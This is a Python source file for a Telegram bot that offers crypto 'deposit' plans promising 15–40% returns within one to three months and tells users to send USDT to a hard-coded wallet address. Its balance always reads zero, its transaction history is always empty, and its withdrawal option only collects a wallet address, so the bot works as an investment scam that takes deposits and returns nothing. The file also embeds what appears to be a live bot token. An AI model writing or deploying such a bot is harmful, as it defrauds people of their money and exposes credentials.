from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
import os

TOKEN = TOKEN = "7694803091:AAHuTDU5q6fXOX77SeTOTZqfUAcPIbOWcok"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("💵 Deposit", callback_data="deposit")],
        [InlineKeyboardButton("💸 Withdraw", callback_data="withdraw")],
        [InlineKeyboardButton("📊 Balance", callback_data="balance")],
        [InlineKeyboardButton("🧾 Transactions", callback_data="transactions")],
        [InlineKeyboardButton("📞 Contact Support", callback_data="support")],
    ]
    await update.message.reply_text("Welcome! Choose an option below:", reply_markup=InlineKeyboardMarkup(keyboard))

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "deposit":
        options = [
            [InlineKeyboardButton("100 USDT", callback_data="d100")],
            [InlineKeyboardButton("500 USDT", callback_data="d500")],
            [InlineKeyboardButton("1000 USDT", callback_data="d1000")],
        ]
        await query.edit_message_text("Choose amount to deposit:", reply_markup=InlineKeyboardMarkup(options))

    elif data.startswith("d"):
        amount = int(data[1:])
        plans = [
            [InlineKeyboardButton("1 Month (+15%)", callback_data=f"loan_{amount}_1")],
            [InlineKeyboardButton("2 Months (+34%)", callback_data=f"loan_{amount}_2")],
            [InlineKeyboardButton("3 Months (+40%)", callback_data=f"loan_{amount}_3")],
        ]
        await query.edit_message_text(f"Deposit {amount} USDT selected.\nChoose loan duration:", reply_markup=InlineKeyboardMarkup(plans))

    elif data.startswith("loan_"):
        _, amount, months = data.split("_")
        bonuses = {"1": 15, "2": 34, "3": 40}
        bonus = bonuses.get(months, 0)
        total = int(amount) + int(amount) * bonus // 100
        await query.edit_message_text(
            f"✅ Deposit: {amount} USDT\n"
            f"⏳ Plan: {months} Month(s)\n"
            f"💰 You will receive: {total} USDT\n\n"
            f"📥 Send USDT to:\n"
            f"`0x0797c9f1b6f3c5c483c4fa54da69652b6a4fb97e`\n"
            f"Network: BEP-20 or ETH\n\n"
            f"Once done, wait for confirmation."
        )

    elif data == "withdraw":
        await query.edit_message_text("✏️ Please send your wallet address (BEP-20 or ETH).\nWe’ll approve and send your funds within 24h.")

    elif data == "balance":
        await query.edit_message_text("📊 Your balance is: 0 USDT")

    elif data == "transactions":
        await query.edit_message_text("🧾 No transactions found yet.")

    elif data == "support":
        await query.edit_message_text("📞 Contact support: @sharks_mi")

    else:
        await query.edit_message_text("❓ Unknown option.")

if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.run_polling()
